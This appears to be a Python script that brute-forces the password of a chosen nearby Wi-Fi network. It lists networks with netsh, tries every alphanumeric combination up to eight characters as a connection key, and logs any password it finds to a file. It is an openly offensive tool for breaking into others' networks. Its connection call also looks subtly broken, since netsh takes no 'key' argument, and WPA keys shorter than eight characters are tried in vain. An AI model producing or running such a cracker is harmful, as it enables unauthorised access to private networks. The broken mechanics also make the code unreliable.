import subprocess
import re
import itertools
import sys
from colorama import Fore, Style, init

def list_available_networks():
    result = subprocess.run(['netsh', 'wlan', 'show', 'network'], capture_output=True, text=True)
    networks = re.findall(r'SSID \d+ : (.+)', result.stdout)
    return networks

def connect_to_wifi(ssid, password):
    result = subprocess.run(['netsh', 'wlan', 'connect', 'name', ssid, 'key', f'"{password}"'], capture_output=True, text=True)
    return "successfully" in result.stdout

def crack_wifi_password(ssid, character_set, max_length):
    for length in range(1, max_length + 1):
        total_attempts = len(character_set) ** length
        current_attempt = 0

        for attempt in itertools.product(character_set, repeat=length):
            current_attempt += 1
            password = ''.join(attempt)
            if connect_to_wifi(ssid, password):
                print(f"\nPassword found: {Fore.GREEN}{password}{Style.RESET_ALL}")
                with open("wifi_passwords.txt", "a") as file:
                    file.write(f"Network: {ssid}, Password: {password}\n")
                return

            progress = current_attempt / total_attempts * 100
            progress_bar = f"{'*' * (current_attempt * max_length // total_attempts)}{'_' * (max_length - (current_attempt * max_length // total_attempts))}"
            sys.stdout.write(f"\r{Fore.GREEN}Trying password:{Style.RESET_ALL} {Fore.GREEN}{progress_bar}{Style.RESET_ALL} - {Fore.GREEN}Progress:{Style.RESET_ALL} {Fore.GREEN}{progress:.2f}%{Style.RESET_ALL}")
            sys.stdout.flush()

if __name__ == "__main__":
    init() # colorama inicializálása

    networks = list_available_networks()
    print(f"{Fore.GREEN}Available Wi-Fi networks:{Style.RESET_ALL}")
    for i, network in enumerate(networks, start=1):
        print(f"{Fore.GREEN}{i}. {network}{Style.RESET_ALL}")

    choice = int(input(f"{Fore.GREEN}Select a Wi-Fi network to crack (enter number): {Style.RESET_ALL}"))
    selected_network = networks[choice - 1]

    character_set = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    max_length = min(8, int(input(f"{Fore.GREEN}Enter maximum password length: {Style.RESET_ALL}")))

    crack_wifi_password(selected_network, character_set, max_length)
